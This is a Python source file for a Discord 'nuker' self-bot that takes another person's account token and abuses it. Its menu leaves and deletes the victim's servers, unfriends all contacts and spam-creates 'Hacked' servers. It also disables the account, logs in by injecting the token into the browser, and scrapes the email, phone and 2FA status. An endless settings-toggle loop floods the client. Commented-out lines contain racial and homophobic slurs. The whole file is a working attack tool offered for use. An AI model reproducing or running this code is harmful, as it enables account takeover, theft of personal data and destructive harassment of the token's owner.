import random
import requests
import os
from discord.ext import commands
from colorama import Fore, init
from selenium import webdriver
from itertools import cycle

init(convert=True)
clear = lambda: os.system('clear')
clear()
# start discord connection using discord.ext
bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

token = input(
    """\033[95m
	
	███████╗ ██████╗██╗   ██╗███████╗███████╗████████╗████████╗
	██╔════╝██╔════╝██║   ██║██╔════╝██╔════╝╚══██╔══╝╚══██╔══╝
	███████╗██║     ██║   ██║█████╗  █████╗     ██║      ██║   
	╚════██║██║     ██║   ██║██╔══╝  ██╔══╝     ██║      ██║   
	███████║╚██████╗╚██████╔╝██║     ██║██╗     ██║      ██║   
	╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝      ╚═╝   
                                                           
	
\033[91m
                         Scuffed Is Not Simply A
                          Server Nor Community
                           It Is A Lifestyle 
                               涙 を 流 す"""
    "\033[91m\n\n                  +-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+\n                   E n t e r   T o k e n   B e l o w\n                  +-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+\n                  Token:\033[00m"
)
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
# checks for valid token
if src.status_code == 200:
    print('Token Valid ')
    input("Press Any Key To Continue...")
else:
    print('Invalid Token')
    input("Press Any Key To Exit...")
    exit(0)

print('\n')
print('1 - NUKE')
print('2 - REMOVE ALL FRIENDS')
print('3 - DELETE AND LEAVE ALL SERVERS')
print('4 - SPAM SERVERS')
print('5 - DISABLE ACCOUNT')
print('6 - LOGIN WITH TOKEN')
print('7 - GRAP ACCOUNT INFO')
print('8 - GIVE TOKEN OWNER A STROKE')
print('9 - PERMANENTLY DISABLE ACCOUNT (Impossible to get it back lol, WIP)')
print('\n')

# preform all of the actions listed in help menu in order
def nuke():
    print("Loading...")
    print('\n')

    @bot.event
    async def on_ready(times: int = 100):

        print('STATUS : [NUKE]')
        print('\n')
        print('1 - LEAVING SERVERS')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f'CANT DELETE [{guild.name}]')

        print('\n')
        print('3 - REMOVING ALL FRIENDS')
        print('\n')

        for user in bot.user.friends:
            try:
               # optional message before removing friends
               # await user.dm_channel.send('nigga')
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print('4 - SPAMMING SERVERS')
        print('\n')

        for i in range(times):
            await bot.create_guild('"Hacked" By tear#9999 /github.com/therealtear', region=None, icon=None)
            print(f'{i} useless server created')
        print('\n')
        print('Max server limit is [100]')
        print('\n')
        print('\n')
        print('5 - CRASHING DISCORD')
        print('\n')

        print('\n')
        print("CRASHING THE TOKEN OWNER'S DISCORD...")
        print(
            'IF YOU WANNA KEEP GIVING TOKEN OWNER A STROKE THEN KEEP scuff.tt RUNNING'
        )
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings",
                headers=headers,
                json=setting)

    bot.run(token, bot=False)

# unfriend entire friends list
def unfriender():
    print("Loading...")

    @bot.event
    async def on_ready():
        print('STATUS : [UNFRIENDER]')

        for user in bot.user.friends:
            try:
               # send all friends a dm before unfriending just for all the melifags and skids out there
               # tryna rep their name with someone else's tool that they slapped some shit acsii art on and called it theirs :)
               # embed=discord.Embed(title="Nuker by tear#9999", description="lmao skid fag gtfo", color=0x0000ff) 
               # embed.set_author(name="this retard skidded my shit now he pays") 
               # embed.set_footer(text="nigger fags try me i fucking dare u")
               # embed.set_image(url="https://cdn.discordapp.com/attachments/794495176601108521/798076657083744276/image0.gif") 
               # await user.dm_channel.send(embed=embed)
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print(
            '[[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)


# server leaver
def leaver():
    print("Loading...")
    #bot.logout

    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'cant leave [{guild.name}] but it will be deleted...')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f"CAN'T DELETE [{guild.name}]")

        print('\n')
        print('[[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)

# create an obsurd ammount of servers before discord limits you
def spamservers():
    print("Loading...")

    @bot.event
    async def on_ready(times: int = 100):
        print('STATUS : [SERVER SPAMMER]')

        for i in range(times):
            await bot.create_guild(
                '"Hacked" By tear#9999 /github.com/therealtear', region=None, icon=None)
            print(f'{i} useless server created')

        print('max server limit is [100]')
        print('\n')
        print('[[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
        input()

    bot.run(token, bot=False)

# temporarly disable user's token until sign in can be quite a surprise on opposing end
def tokenDisable(token):
    print('STATUS : [DISABLING TOKEN]')
    r = requests.patch(
        'https://discordapp.com/api/v6/users/@me',
        headers={'Authorization': token})
    if r.status_code == 400:
        print(f'Account disabled successfully')
        input("Press any key to exit...")
    else:
        print(f'Invalid token')
        input("Press any key to exit...")


def tokenLogin(token):
    print('STATUS : [LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

# scrape basic info off user's token (WIP)
def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
            # server count:
            # friend count:
            # current clients signed into this token:
        input()

# fairly self explanatory lol
def crashdiscord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print("CRASHING TOKEN OWNER'S DISCORD...")
    print('IF YOU WANNA KEEP CRASHING THEIR DISCORD CLIENT KEEP THE TOOL RUNNING')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        requests.patch(
            "https://discord.com/api/v6/users/@me/settings",
            headers=headers,
            json=setting)


# discord account disable via cc honeypot exploit coming soon (WIP)
# def accdisable(token)


# simple and fast cli to wreak havoc in a hurry
def mainanswer():
  
    answer = input('\033[1;00m[\033[91mscuff.tt\033[1;00m]-\033[91m涙\033[00m Choose : ')
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenDisable(token)
    elif answer == '6':
        tokenLogin(token)
    elif answer == '7':
        tokenInfo(token)
    elif answer == '8':
        crashdiscord(token)
    else:
        print('Invalid option, please choose a number')
        mainanswer()


mainanswer()

# made by tear
# https://github.com/therealtear